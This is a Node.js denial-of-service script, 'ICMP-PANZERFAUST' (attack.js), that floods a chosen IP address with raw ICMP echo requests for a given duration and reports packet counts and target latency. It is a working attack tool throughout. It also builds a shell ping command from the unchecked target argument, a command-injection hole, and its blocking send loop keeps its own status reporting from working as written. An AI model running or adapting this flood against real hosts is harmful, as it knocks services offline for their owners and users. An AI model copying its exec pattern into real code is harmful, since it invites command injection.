const raw = require('raw-socket');
const { exec } = require('child_process');

if (process.argv.length !== 4) {
  console.log('Usage: node attack.js <target_ip> <duration_seconds>');
  process.exit(1);
}

const target = process.argv[2];
const durationMs = parseInt(process.argv[3], 10) * 1000;

const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

function checksum(buf) {
  let sum = 0;
  for (let i = 0; i < buf.length; i += 2) {
    sum += buf.readUInt16BE(i);
  }
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }
  return ~sum & 0xFFFF;
}

function createICMPPacket(seq) {
  const buf = Buffer.alloc(8);
  buf.writeUInt8(8, 0); // Type: Echo request
  buf.writeUInt8(0, 1); // Code
  buf.writeUInt16BE(0, 2); // Checksum placeholder
  buf.writeUInt16BE(process.pid & 0xFFFF, 4); // Identifier
  buf.writeUInt16BE(seq & 0xFFFF, 6); // Sequence number
  const csum = checksum(buf);
  buf.writeUInt16BE(csum, 2);
  return buf;
}

let sent = 0;
let success = 0;
let failed = 0;
let seq = 0;
let maxPPS = 0;
let ppsCounter = 0;

const endTime = Date.now() + durationMs;

console.log('ICMP-PANZERFAUST');
console.log('--------------------------------------');
console.log(`Target: ${target}`);
console.log(`Duration: ${durationMs / 1000}s`);
console.log('Starting attack...\n');

function getPingLatency(ip, callback) {
  // Cross-platform ping command
  const platform = process.platform;
  let cmd = '';

  if (platform === 'win32') {
    cmd = `ping -n 1 ${ip}`;
  } else {
    cmd = `ping -c 1 ${ip}`;
  }

  exec(cmd, (error, stdout) => {
    if (error) {
      callback(null);
      return;
    }

    // Extract latency from ping output
    let timeMatch = null;

    if (platform === 'win32') {
      timeMatch = stdout.match(/Average = (\d+)ms/);
      if (!timeMatch) timeMatch = stdout.match(/time=(\d+)ms/);
    } else {
      timeMatch = stdout.match(/time=([\d.]+) ms/);
    }

    if (timeMatch && timeMatch[1]) {
      callback(timeMatch[1]);
    } else {
      callback(null);
    }
  });
}

function logStatus() {
  const currentPPS = ppsCounter / 4;
  if (currentPPS > maxPPS) maxPPS = currentPPS;

  getPingLatency(target, (latency) => {
    console.log('--------------------------------------');
    console.log(`Success: ${success}`);
    console.log(`Failed: ${failed}`);
    console.log(`Max PPS: ${maxPPS.toFixed(2)}`);
    console.log(`Total sent: ${sent}`);
    console.log(`Target latency: ${latency !== null ? latency + ' ms' : 'N/A'}`);
    console.log('--------------------------------------\n');
    // Reset PPS counter for next interval
    ppsCounter = 0;
  });
}

function flood() {
  while (Date.now() < endTime) {
    const packet = createICMPPacket(seq++);
    socket.send(packet, 0, packet.length, target, (err) => {
      sent++;
      ppsCounter++;
      if (err) failed++;
      else success++;
    });
  }
  socket.close();
  console.log('Attack finished.');
  logStatus();
  process.exit(0);
}

// Log status every 4 seconds until attack ends
const intervalId = setInterval(() => {
  if (Date.now() >= endTime) {
    clearInterval(intervalId);
    return;
  }
  logStatus();
}, 4000);

flood();
